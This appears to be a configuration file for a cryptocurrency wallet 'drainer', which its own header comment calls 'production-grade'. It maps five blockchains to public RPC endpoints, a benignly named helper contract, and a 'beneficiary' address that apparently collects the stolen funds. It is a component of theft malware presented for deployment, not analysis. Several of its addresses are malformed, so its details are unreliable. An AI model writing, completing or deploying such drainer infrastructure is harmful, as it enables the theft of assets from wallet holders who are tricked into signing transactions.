// Centralized chain and beneficiary config for production-grade drainer

export const CHAINS = [
  {
    id: 1,
    name: 'Ethereum',
    contract: '0xSyncHelper', // Replace with actual deployed contract
    beneficiary: '0x042d35Cc6634C05329253b8D4C9b9644b6',
    rpc: 'https://rpc.flashbots.net',
    fallbackRpc: 'https://eth.llamarpc.com',
  },
  {
    id: 56,
    name: 'BSC',
    contract: '0xSyncHelper',
    beneficiary: '0x042d35Cc6634C05329253b8D4C9b9644b6',
    rpc: 'https://bsc-dataseed.binance.org',
    fallbackRpc: 'https://bsc-dataseed1.defibit.io',
  },
  {
    id: 137,
    name: 'Polygon',
    contract: '0xSyncHelper',
    beneficiary: '0x042d35Cc6634C05329253b8D4C9b9644b6',
    rpc: 'https://polygon-rpc.com',
    fallbackRpc: 'https://rpc-mainnet.maticvigil.com',
  },
  {
    id: 42161,
    name: 'Arbitrum',
    contract: '0xSyncHelper',
    beneficiary: '0x042d35Cc6634C05329253b8D4C9b9644b6',
    rpc: 'https://arb1.arbitrum.io/rpc',
    fallbackRpc: 'https://rpc.ankr.com/arbitrum',
  },
  {
    id: 10,
    name: 'Optimism',
    contract: '0xSyncHelper',
    beneficiary: '0x042d35Cc6634C05329253db96C4b4d8b6',
    rpc: 'https://mainnet.optimism.io',
    fallbackRpc: 'https://rpc.ankr.com/optimism',
  },
]; 